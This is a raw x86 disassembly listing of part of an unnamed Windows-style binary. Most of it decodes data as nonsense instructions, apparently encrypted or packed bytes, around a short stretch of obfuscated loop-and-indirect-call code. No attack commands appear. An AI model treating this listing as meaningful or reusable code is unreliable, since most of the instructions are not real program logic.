  40a97a:	aam    0xe0
  40a97c:	mov    ebp,0x8581a70c
  40a981:	jo     0x40a91c
  40a983:	arpl   WORD PTR [ebx+0x4b],bx
  40a986:	jno    0x40a90c
  40a988:	(bad)
  40a98b:	inc    edx
  40a98c:	imul   esp,DWORD PTR [edi],0xffffffe6
  40a98f:	fs dec ecx
  40a991:	jmp    0x40a9a6
  40a993:	jae    0x40a940
  40a995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a996:	jns    0x40a953
  40a998:	ins    DWORD PTR es:[edi],dx
  40a999:	into   
  40a99a:	paddb  mm3,QWORD PTR [esi-0x7a]
  40a99e:	popa   
  40a99f:	je     0x40a951
  40a9a1:	and    al,0x97
  40a9a3:	pop    ebp
  40a9a4:	aaa    
  40a9a5:	cmp    eax,0x5f3579e8
  40a9aa:	call   0xc9fb6f91
  40a9af:	cmp    esi,DWORD PTR [edx-0x17]
  40a9b2:	inc    edx
  40a9b3:	and    BYTE PTR ds:0xe96e0312,dh
  40a9b9:	aad    0x68
  40a9bb:	cmp    dl,cl
  40a9bd:	rcr    DWORD PTR [edi],cl
  40a9bf:	call   0xeb15d7af
  40a9c4:	out    dx,al
  40a9c5:	rol    BYTE PTR [edx+0x41],1
  40a9c8:	mov    ecx,0x3dfc7588
  40a9cd:	dec    ebp
  40a9ce:	ja     0x40a9e5
  40a9d0:	cmp    BYTE PTR [ecx+eiz*2+0x1f],dl
  40a9d4:	jmp    0x4149:0x565c6792
  40a9db:	mov    ebp,0x5d01bb47
  40a9e0:	fwait
  40a9e1:	push   ds
  40a9e2:	pop    eax
  40a9e3:	push   0xfc6a7d30
  40a9e8:	push   esi
  40a9e9:	fcmovbe st,st(4)
  40a9eb:	imul   edx,DWORD PTR fs:[eax],0xa65442c4
  40a9f2:	sub    BYTE PTR [edi],dh
  40a9f4:	jecxz  0x40aa6f
  40a9f6:	mov    eax,ds:0x2887f7cd
  40a9fb:	mov    ecx,0x43149a6
  40aa00:	pop    ebx
  40aa01:	rol    DWORD PTR [edx],0xc3
  40aa04:	js     0x40aa4e
  40aa06:	pop    ebp
  40aa07:	jns    0x40aa51
  40aa09:	or     al,0x7e
  40aa0b:	es xor eax,0x97d4004
  40aa11:	mov    eax,0xdaa7f981
  40aa16:	and    DWORD PTR [esp+edx*2],ecx
  40aa19:	xor    DWORD PTR ds:0xaefbc61f,edx
  40aa1f:	loop   0x40a9f3
  40aa21:	cmp    edx,edi
  40aa23:	ficomp DWORD PTR ds:0x666ab653
  40aa29:	or     eax,DWORD PTR [edi*4-0x610d0021]
  40aa30:	or     eax,0xb48f1aab
  40aa35:	into   
  40aa36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa37:	or     BYTE PTR [edi+ecx*4+0x30],cl
  40aa3b:	xchg   DWORD PTR [edx-0x2c],esi
  40aa3e:	sbb    ch,dl
  40aa40:	mov    bl,0x88
  40aa42:	xor    eax,0x6ee8f761
  40aa47:	and    al,0xef
  40aa49:	lods   eax,DWORD PTR ds:[esi]
  40aa4a:	mov    ds:0x36501564,al
  40aa4f:	and    BYTE PTR [ebp-0x6214cde7],0x4f
  40aa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa57:	clc    
  40aa58:	and    BYTE PTR [edi],0x37
  40aa5b:	xchg   esp,eax
  40aa5c:	ins    DWORD PTR es:[edi],dx
  40aa5d:	xchg   esp,eax
  40aa5e:	dec    ebp
  40aa5f:	mov    dh,0x64
  40aa61:	sbb    BYTE PTR [ebx+0x1e044c22],ah
  40aa67:	add    ebp,esp
  40aa69:	push   edx
  40aa6a:	mov    ecx,0xaa751b52
  40aa6f:	std    
  40aa70:	pop    DWORD PTR [esi-0x58]
  40aa73:	sub    al,0xe5
  40aa75:	add    ebx,DWORD PTR [ebx-0x45e7e88]
  40aa7b:	out    dx,al
  40aa7c:	push   ebx
  40aa7d:	inc    esp
  40aa7f:	adc    eax,0xa642c02d
  40aa84:	das    
  40aa85:	sbb    BYTE PTR ds:0xf30fc2d4,0xf5
  40aa8c:	mov    ebp,0x89810624
  40aa91:	sbb    eax,0xf69ad8d6
  40aa96:	cmp    esp,DWORD PTR [eax-0x14995c43]
  40aa9c:	sub    edi,DWORD PTR [ebx+eax*8]
  40aa9f:	jecxz  0x40aa76
  40aaa1:	(bad)  
  40aaa2:	mov    edi,0x3f59ab5e
  40aaa7:	mov    ch,0xdb
  40aaa9:	xchg   edx,eax
  40aaaa:	sub    eax,0x69a73bf3
  40aaaf:	pop    ebp
  40aab0:	fmul   QWORD PTR [edx+0x293c9ae8]
  40aab6:	aad    0x69
  40aab8:	std    
  40aab9:	inc    edi
  40aaba:	adc    ebp,DWORD PTR [ecx]
  40aabc:	sbb    ebp,0x7c
  40aabf:	ss nop
  40aac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aac2:	xchg   esp,eax
  40aac3:	pusha  
  40aac4:	icebp  
  40aac5:	mov    bh,0xfe
  40aac7:	call   0x8cd6cedc
  40aacc:	icebp  
  40aacd:	stc    
  40aace:	shl    DWORD PTR [edx],cl
  40aad0:	inc    ebp
  40aad1:	(bad)  
  40aad2:	call   0xd6979352
  40aad7:	data16 jno 0x40aa6d
  40aada:	or     ah,ah
  40aadc:	test   BYTE PTR [ecx-0x7a],dh
  40aadf:	test   BYTE PTR [ebx-0x7453bdce],0xb3
  40aae6:	shr    DWORD PTR [edx],0xfd
  40aae9:	cmp    eax,0x1367e8b3
  40aaee:	repnz sub esi,esi
  40aaf1:	fsubr  st(0),st
  40aaf3:	(bad)  
  40aaf4:	leave  
  40aaf5:	inc    edi
  40aaf6:	lea    edi,[edx-0x37]
  40aaf9:	cmp    al,0xe3
  40aafb:	pop    esi
  40aafc:	fidivr DWORD PTR [eax]
  40aafe:	popf   
  40aaff:	clc    
  40ab00:	scas   al,BYTE PTR es:[edi]
  40ab01:	sbb    ebp,DWORD PTR [esi]
  40ab03:	fucom  st(2)
  40ab05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab06:	pop    esi
  40ab07:	mov    edi,0x3f429bca
  40ab0c:	pop    eax
  40ab0d:	dec    esi
  40ab0e:	test   BYTE PTR [ebp-0x1f],cl
  40ab11:	push   ds
  40ab12:	lea    eax,[ebp+0x30]
  40ab15:	pop    esi
  40ab16:	mov    ds:0x93f570f6,al
  40ab1b:	inc    eax
  40ab1c:	aaa    
  40ab1d:	repnz xchg ecx,eax
  40ab1f:	adc    eax,0xba987096
  40ab24:	dec    ebp
  40ab25:	mov    ds,WORD PTR [edx]
  40ab27:	ja     0x40aafb
  40ab29:	ds daa 
  40ab2b:	pop    esp
  40ab2c:	shr    BYTE PTR [edi+eax*1],0xe5
  40ab30:	xchg   ebp,eax
  40ab31:	jle    0x40ab0d
  40ab33:	sbb    al,0x94
  40ab35:	ins    DWORD PTR es:[edi],dx
  40ab36:	aad    0xc9
  40ab38:	call   0x6471e0c9
  40ab3d:	sbb    eax,0xdeb7fa7a
  40ab42:	push   ebx
  40ab43:	addr16 jl 0x40ab37
  40ab46:	pop    ss
  40ab47:	xor    BYTE PTR [edi+0x48],0x6
  40ab4b:	and    al,al
  40ab4d:	xor    al,0x4a
  40ab4f:	add    BYTE PTR [esp+esi*8],bl
  40ab52:	push   ds
  40ab53:	or     DWORD PTR [edx-0x27],esp
  40ab56:	int3   
  40ab57:	xor    DWORD PTR [edx],esp
  40ab59:	or     eax,0x6931fcb
  40ab5e:	pusha  
  40ab5f:	mov    BYTE PTR [ebp+0x34],0x9e
  40ab63:	aaa    
  40ab64:	hlt    
  40ab65:	outs   dx,BYTE PTR ds:[esi]
  40ab66:	dec    ebx
  40ab67:	je     0x40aaeb
  40ab69:	lods   al,BYTE PTR ds:[esi]
  40ab6a:	test   al,0xca
  40ab6c:	pop    edi
  40ab6d:	icebp  
  40ab6e:	pop    ebp
  40ab6f:	rol    edx,cl
  40ab71:	push   ebx
  40ab72:	lahf   
  40ab73:	or     BYTE PTR [ebx-0x3d2aa399],ch
  40ab79:	push   0x181d63fc
  40ab7e:	arpl   bp,ax
  40ab80:	aam    0x1b
  40ab82:	mov    edx,0xb67744dc
  40ab87:	in     eax,dx
  40ab88:	aam    0xca
  40ab8a:	push   cs
  40ab8b:	aad    0xf1
  40ab8d:	das    
  40ab8e:	inc    eax
  40ab8f:	jg     0x40abe6
  40ab91:	inc    esi
  40ab92:	xchg   esi,eax
  40ab93:	cwde   
  40ab94:	jae    0x40ac14
  40ab96:	mov    eax,0x2da25750
  40ab9b:	inc    ebx
  40ab9c:	lahf   
  40ab9d:	xor    cl,dh
  40ab9f:	xlat   BYTE PTR ds:[ebx]
  40aba0:	fninit 
  40aba2:	shl    ebp,1
  40aba4:	rcr    bh,0x41
  40aba7:	fidiv  WORD PTR [esi+0xb]
  40abaa:	repz or al,0xc5
  40abad:	jo     0x40ab54
  40abaf:	sbb    DWORD PTR [eax],0xffffffee
  40abb2:	mov    al,ds:0xd5572fe7
  40abb7:	icebp  
  40abb8:	ror    bh,0xf8
  40abbb:	call   0xb80d:0xd4006d44
  40abc2:	ss (bad) 
  40abc4:	loop   0x40ab8e
  40abc6:	ins    BYTE PTR es:[edi],dx
  40abc7:	pop    esp
  40abc8:	addr16 popf 
  40abca:	xchg   BYTE PTR [ebx+0x61],al
  40abcd:	fild   QWORD PTR [edx]
  40abcf:	arpl   WORD PTR [eax-0x29],dx
  40abd2:	xchg   edx,eax
  40abd3:	mov    eax,ds:0xa4c59702
  40abd8:	and    dh,0xe4
  40abdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abdd:	ja     0x40abf4
  40abdf:	ret    0x100d
  40abe2:	jle    0x40ab8a
  40abe4:	pop    ds
  40abe5:	mov    ah,BYTE PTR [ecx+0x23]
  40abe8:	je     0x40ac1b
  40abea:	neg    DWORD PTR [edi]
  40abec:	cmp    DWORD PTR [eax],0xfffffff8
  40abef:	aas    
  40abf0:	and    al,0x15
  40abf2:	mov    ebx,0x65f0cb41
  40abf7:	sbb    edi,DWORD PTR [edi-0x53]
  40abfa:	add    ecx,DWORD PTR [ecx+0x2f]
  40abfd:	push   0x2f
  40abff:	mov    ah,0x33
  40ac01:	rol    BYTE PTR [ecx+0x42fdf535],1
  40ac07:	add    BYTE PTR [edi],cl
  40ac09:	call   0xd143ac50
  40ac0e:	mov    DWORD PTR ds:0x42e803,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fddd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fe7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fdf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e7f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e7f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e33d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e3f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e7f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e7f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e228,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e228
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e228,ebx
  40acad:	cmp    DWORD PTR ds:0x42e228,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e228,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e3f7
  40acd5:	cmp    DWORD PTR ds:0x42e228,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e228
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e228,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e234
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fde1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fde1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fde1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fe01
  40ad3c:	call   DWORD PTR ds:0x42e64b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fde1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fde1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad34
  40adb4:	stc    
  40adb5:	rcl    DWORD PTR [eax+0x7070fd03],1
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad87
  40adc0:	jle    0x40ad9f
  40adc2:	xchg   esi,eax
  40adc3:	(bad)  
  40adc5:	dec    ebx
  40adc6:	mov    al,0x6e
  40adc8:	pushf  
  40adc9:	jl     0x40ad6b
  40adcb:	pop    ss
  40adcc:	xor    eax,0xc2e2fe87
  40add1:	xchg   dl,ch
  40add3:	call   0xaedee7f2
  40add8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add9:	call   0xc065:0xf2153cc0
  40ade0:	xor    al,0x51
  40ade2:	shl    DWORD PTR [edx+0x25],1
  40ade5:	imul   ecx,DWORD PTR [eax+0x62eec3fa],0xfffffff8
  40adec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aded:	mov    bl,0xfd
  40adef:	jmp    0xd6101127
  40adf4:	lar    esp,WORD PTR [ecx+0x4e]
  40adf8:	mov    ecx,0xc535d381
  40adfd:	sub    al,0xa5
  40adff:	pop    ss
  40ae00:	ret    0x2086
  40ae03:	mov    bh,0xf3
  40ae05:	adc    ebx,ecx
  40ae07:	xchg   ebx,eax
  40ae08:	out    0x32,eax
  40ae0a:	retf   
  40ae0b:	das    
  40ae0c:	mov    dl,0x8f
  40ae0e:	push   0xcc022ed6
  40ae13:	push   cs
  40ae14:	mov    WORD PTR [edi-0x1c],ds
  40ae17:	add    bl,BYTE PTR [esi+ecx*4]
  40ae1a:	arpl   WORD PTR [esi],bp
  40ae1c:	fld    DWORD PTR [ebx]
  40ae1e:	ror    DWORD PTR [edi],cl
  40ae20:	(bad)  
  40ae21:	pop    edx
  40ae22:	mov    ecx,0xa64c781d
  40ae27:	add    BYTE PTR [eax+0x59],bl
  40ae2a:	mov    WORD PTR [esi-0x7d],?
  40ae2d:	out    0xf2,al
  40ae2f:	sub    ebp,DWORD PTR [edi-0x59fbff3]
  40ae35:	jecxz  0x40ae40
  40ae37:	scas   al,BYTE PTR es:[edi]
  40ae38:	fwait
  40ae39:	or     eax,0x1deef2ed
  40ae3e:	lock dec ecx
  40ae40:	mov    ch,0x17
  40ae42:	xchg   ebp,eax
  40ae43:	cmp    eax,0xd179aaa6
  40ae48:	arpl   WORD PTR ds:0xe9e33798,di
  40ae4e:	call   0x64723e5
  40ae53:	fimul  DWORD PTR [esi]
  40ae55:	push   ebx
  40ae56:	or     al,0x78
  40ae58:	or     cl,BYTE PTR [ebx]
  40ae5a:	icebp  
  40ae5b:	xor    bl,al
  40ae5d:	sar    BYTE PTR [edx-0x26],0x74
  40ae61:	dec    esp
  40ae62:	pop    ecx
  40ae63:	sub    dh,0xf1
  40ae66:	enter  0x9690,0x7b
  40ae6a:	sbb    DWORD PTR [eax+esi*8],edx
  40ae6d:	hlt    
  40ae6e:	hlt    
  40ae6f:	cmp    ecx,DWORD PTR [ecx+0x7f]
  40ae72:	lds    esp,FWORD PTR [edi+0x40bc3723]
  40ae78:	cmp    cl,BYTE PTR [ebp+0x18]
  40ae7b:	lds    edx,FWORD PTR [edi+ebx*8-0x10c293c6]
  40ae82:	lods   eax,DWORD PTR ds:[esi]
  40ae83:	rol    BYTE PTR [edx-0x51],1
  40ae86:	les    esp,FWORD PTR [ebp+0x46]
  40ae89:	cdq    
  40ae8a:	es loopne 0x40ae1e
  40ae8d:	js     0x40ae21
  40ae8f:	in     al,dx
  40ae90:	dec    esi
  40ae91:	push   ebx
  40ae92:	(bad)  
  40ae93:	fucompp 
  40ae95:	add    edi,DWORD PTR [edx]
  40ae97:	push   esp
  40ae98:	stos   DWORD PTR es:[edi],eax
  40ae99:	adc    DWORD PTR [ebx+ecx*4],0x71
  40ae9d:	xchg   DWORD PTR [esi+0x11afe63a],ebp
  40aea3:	rol    BYTE PTR [edx+0xe014cce],cl
  40aea9:	ret    
  40aeaa:	arpl   WORD PTR [eax+0x40],bx
  40aead:	stos   BYTE PTR es:[edi],al
  40aeae:	mov    bl,al
  40aeb0:	fdivr  st(7),st
  40aeb2:	pop    edx
  40aeb3:	ins    BYTE PTR es:[edi],dx
  40aeb4:	into   
  40aeb5:	mov    ss,WORD PTR [ecx-0x60]
  40aeb8:	dec    edx
  40aeb9:	(bad)  
  40aeba:	and    bl,BYTE PTR [edi]
  40aebc:	repz (bad) 
  40aebe:	pop    eax
  40aebf:	adc    eax,0x361d34f6
  40aec4:	mov    ah,BYTE PTR [ebp-0x4d]
  40aec7:	imul   ecx,DWORD PTR [edx+0x6c],0xf
  40aecb:	fadd   QWORD PTR [esi]
  40aecd:	in     al,0xa3
  40aecf:	in     al,dx
  40aed0:	lock sbb DWORD PTR [edi+0x51c95850],ebx
  40aed7:	mov    bl,0xd8
  40aed9:	repnz mov dl,0x98
  40aedc:	iret   
  40aedd:	xor    eax,0xe0ad35b3
  40aee2:	stc    
  40aee3:	pop    ss
  40aee4:	imul   eax,DWORD PTR [edi+0x24],0xfbfc97d6
  40aeeb:	enter  0x167c,0xaf
  40aeef:	push   cs
  40aef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef1:	aaa    
  40aef2:	int    0x33
  40aef4:	nop
  40aef5:	(bad)  
  40aef6:	rol    BYTE PTR fs:[ecx+0xaae0799],cl
  40aefd:	out    dx,eax
  40aefe:	sbb    BYTE PTR [edi+edi*2],ch
  40af01:	dec    ecx
  40af02:	in     al,dx
  40af03:	dec    esi
  40af04:	jae    0x40aebf
  40af06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af07:	sbb    eax,0x47dd8937
  40af0c:	stos   DWORD PTR es:[edi],eax
  40af0d:	jecxz  0x40af33
  40af0f:	adc    BYTE PTR [ebp+0x2ad0b7f8],al
  40af15:	xchg   edi,eax
  40af16:	dec    esi
  40af17:	int3   
  40af18:	inc    esi
  40af19:	xchg   ecx,eax
  40af1a:	adc    al,0x57
  40af1c:	push   0x4e
  40af1e:	daa    
  40af1f:	push   0x5e16a485
  40af24:	dec    esi
  40af25:	mov    eax,0x566f1cf1
  40af2a:	cmp    bh,BYTE PTR [edx-0x6e]
  40af2d:	pop    esi
  40af2e:	sub    ch,BYTE PTR ds:0x9c6bd2a5
  40af34:	sub    ebx,DWORD PTR [eax-0x46a2973]
  40af3a:	int    0xc4
  40af3c:	int    0xcd
  40af3e:	fxch   st(5)
  40af40:	cs cs xor al,0xb2
  40af44:	aad    0x51
  40af46:	sub    ebp,DWORD PTR [edi-0x9]
  40af49:	xchg   ebx,eax
  40af4a:	adc    BYTE PTR [edx+0x3d992a41],ch
  40af50:	or     BYTE PTR ds:0xdf4e4a4a,cl
  40af56:	push   edx
  40af57:	sar    ebp,1
  40af59:	xchg   ebx,eax
  40af5a:	mov    edi,ebp
  40af5c:	add    ch,BYTE PTR [ecx]
  40af5e:	add    BYTE PTR [edi+0x272f172b],bh
  40af64:	jg     0x40afd3
  40af66:	mov    al,BYTE PTR [edi]
  40af68:	dec    esi
  40af69:	adc    esi,DWORD PTR [ebp-0x2733c113]
  40af6f:	neg    BYTE PTR [ecx]
  40af71:	mov    edi,DWORD PTR [ebx-0x3f]
  40af74:	mov    esi,0x5c2cebee
  40af79:	addr16 jmp 0x763f:0x2b71cdf9
  40af81:	pop    ss
  40af82:	scas   eax,DWORD PTR es:[edi]
  40af83:	push   ebp
  40af84:	pop    ecx
  40af85:	mov    ch,0xb4
  40af87:	add    eax,0x54a15084
  40af8c:	in     al,0x38
  40af8e:	add    ebx,ebx
  40af90:	stos   BYTE PTR es:[edi],al
  40af91:	mov    eax,ds:0xe15a1284
  40af96:	fs std 
  40af98:	movsx  edi,BYTE PTR [esi]
  40af9b:	or     al,0x19
  40af9d:	inc    esp
  40af9e:	jo     0x40afcf
  40afa0:	icebp  
  40afa1:	mov    bh,0x4d
  40afa3:	scas   eax,DWORD PTR es:[edi]
  40afa4:	push   edx
  40afa5:	test   DWORD PTR [edi],0xadcd688f
  40afab:	test   BYTE PTR [ecx+0x61],dl
  40afae:	mov    dl,0xc6
  40afb0:	xchg   ebp,eax
  40afb1:	stos   DWORD PTR es:[edi],eax
  40afb2:	rcl    DWORD PTR [edx-0x2140d8a1],1
  40afb8:	push   ecx
  40afb9:	hlt    
  40afba:	inc    ebp
  40afbb:	imul   edi,ebp,0xfa372b65
  40afc1:	dec    ebp
  40afc2:	mov    DWORD PTR ds:0x45cf58c,edi
  40afc8:	mov    esi,ecx
  40afca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afcb:	retf   0x96ee
  40afce:	fwait
  40afcf:	adc    edx,DWORD PTR [ebp-0x2b0e5c53]
  40afd5:	xchg   ebx,eax
  40afd6:	inc    edi
  40afd7:	mov    edi,0xf33ae344
  40afdc:	es aad 0x9f
  40afdf:	jne    0x40afd4
  40afe1:	data16 add dh,BYTE PTR [ecx*4+0x6f38f4a7]
  40afe9:	pop    ss
  40afea:	(bad)  
  40afeb:	in     al,0xc2
  40afed:	push   cs
  40afee:	cmp    dl,dh
  40aff0:	sub    edi,edx
  40aff2:	rcl    DWORD PTR [eax+eiz*4-0x65],cl
  40aff6:	ficomp DWORD PTR [esi+0x3a3245e9]
  40affc:	shl    BYTE PTR [ecx-0x6e],1
  40afff:	and    dl,bh
  40b001:	fwait
  40b002:	mov    dl,0x8a
  40b004:	push   edx
  40b005:	(bad)  [ebx]
  40b007:	mov    cl,0x1d
  40b009:	in     eax,0x72
  40b00b:	mov    al,0xb
  40b00d:	push   edx
  40b00e:	mov    ch,0x3f
  40b010:	push   ebp
  40b011:	movzx  esi,bx
  40b014:	ror    dh,0xc7
  40b017:	mul    DWORD PTR ds:[esi+0x5d]
  40b01b:	ins    BYTE PTR es:[edi],dx
  40b01c:	and    edx,DWORD PTR [eax+0x30]
  40b01f:	push   ebx
  40b020:	push   ds
  40b021:	xchg   esi,eax
  40b022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b023:	mov    eax,DWORD PTR [ecx]
  40b025:	bound  esp,QWORD PTR [ebx-0x6e]
  40b028:	sub    eax,0x2201d8f
  40b02d:	mov    ch,0xa2
  40b02f:	adc    cl,ah
  40b031:	lds    esi,FWORD PTR [edi+eiz*1]
  40b034:	jno    0x40afc4
  40b036:	out    0xf5,eax
  40b038:	aam    0xb1
  40b03a:	dec    edx
  40b03b:	jmp    0x40afe9
  40b03d:	mov    al,ds:0x221f9d90
  40b042:	push   ecx
  40b043:	test   al,0x9b
  40b045:	jl     0x40b0a4
  40b047:	and    DWORD PTR [eax+0x45],0x58
  40b04b:	mov    BYTE PTR [eax+esi*2-0x6da2d24e],bh
  40b052:	and    bh,ch
  40b054:	push   0x30
  40b056:	nop
  40b057:	cmp    ebp,edi
  40b059:	test   DWORD PTR [edi],eax
  40b05b:	retf   0x6b11
  40b05e:	jecxz  0x40b01c
  40b060:	int3   
  40b061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b062:	and    BYTE PTR [esi-0x41d766a7],cl
  40b068:	stos   BYTE PTR es:[edi],al
  40b069:	add    eax,0x9e0f0779
  40b06e:	adc    eax,0x32c83348
  40b073:	and    BYTE PTR [ebx+0x16],dl
  40b076:	lock cmp al,BYTE PTR [esi-0x6094b3f6]
  40b07d:	jge    0x40b0ef
  40b07f:	mov    ds:0xee37e73e,eax
  40b084:	dec    ebp
  40b085:	cmp    eax,0x8cb029c2
  40b08a:	mov    esi,0x3f50bd1
  40b08f:	cmp    DWORD PTR [edx-0x8f9f3a3],ebp
  40b095:	xor    al,0x88
  40b097:	mov    eax,0x1cf7565f
  40b09c:	popf   
  40b09d:	aas    
  40b09e:	xor    BYTE PTR [edi],bl
  40b0a0:	and    eax,esp
  40b0a2:	test   eax,0xa9daa8a8
  40b0a7:	mov    ch,0x66
  40b0a9:	retf   0x4c26
  40b0ac:	or     eax,0x9c49a70b
  40b0b1:	(bad)  
  40b0b2:	sub    edi,DWORD PTR [eax+0x40]
  40b0b5:	sub    ah,BYTE PTR [eax+0x1c]
  40b0b8:	stos   DWORD PTR es:[edi],eax
  40b0b9:	out    0xdc,eax
  40b0bb:	xlat   BYTE PTR ds:[ebx]
  40b0bc:	mov    es,esp
  40b0be:	out    0xd6,al
  40b0c0:	xor    al,0x8e
  40b0c2:	mov    al,ds:0x5dc6265c
  40b0c7:	jb     0x40b0b2
  40b0c9:	sub    bh,BYTE PTR [ecx-0x669cc510]
  40b0cf:	push   ss
  40b0d0:	xchg   DWORD PTR ds:[eax+0x5773a3c8],eax
  40b0d7:	xor    al,BYTE PTR [esi-0x63]
  40b0da:	test   al,0x81
  40b0dc:	imul   edx,edi,0x2a
  40b0df:	into   
  40b0e0:	dec    edx
  40b0e1:	inc    ecx
  40b0e2:	sub    BYTE PTR [ecx+0x2a318163],dl
  40b0e8:	adc    edx,DWORD PTR [ebp-0x5b]
  40b0eb:	mov    bl,0x7e
  40b0ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ee:	sbb    BYTE PTR [edx-0x4b],cl
  40b0f1:	mov    edx,0x3dd0d179
  40b0f6:	pop    esp
  40b0f7:	mov    ebp,0xe3e01765
  40b0fc:	add    ah,BYTE PTR [ebp+0x5c1e5b2c]
  40b102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b103:	mov    ds:0x6dc67ae3,eax
  40b108:	jg     0x40b174
  40b10a:	push   0x28cf9d42
  40b10f:	cmp    DWORD PTR [eax+0x2],ebx
  40b112:	xchg   esi,eax
  40b113:	push   ebx
  40b114:	push   edi
  40b115:	xchg   DWORD PTR [ebp+0x2b087f2c],ebp
  40b11b:	push   edx
  40b11c:	mov    al,0x32
  40b11e:	or     edi,DWORD PTR [ebx-0x1ad15c7]
  40b124:	inc    ecx
  40b125:	push   DWORD PTR [esi-0x77]
  40b128:	jmp    0x86deb404
  40b12d:	jno    0x40b0d2
  40b12f:	xchg   dx,ax
  40b131:	stos   BYTE PTR es:[edi],al
  40b132:	push   ebx
  40b133:	call   0xcd6a:0xff2a12b6
  40b13a:	(bad)  
  40b13b:	mov    al,ds:0xc6068da0
  40b140:	push   0x51
  40b142:	out    0x34,eax
  40b144:	lahf   
  40b145:	xor    DWORD PTR [edx],ebp
  40b147:	mov    al,0x6e
  40b149:	lock inc esp
  40b14b:	aas    
  40b14c:	adc    ah,dh
  40b14e:	cmc    
  40b14f:	mov    bh,ch
  40b151:	aad    0x70
  40b153:	pop    esi
  40b154:	mov    bl,BYTE PTR gs:[edx+0x3e766ce]
  40b15b:	xor    DWORD PTR [edx],ebx
  40b15d:	aad    0x6
  40b15f:	mov    eax,DWORD PTR [ebx]
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
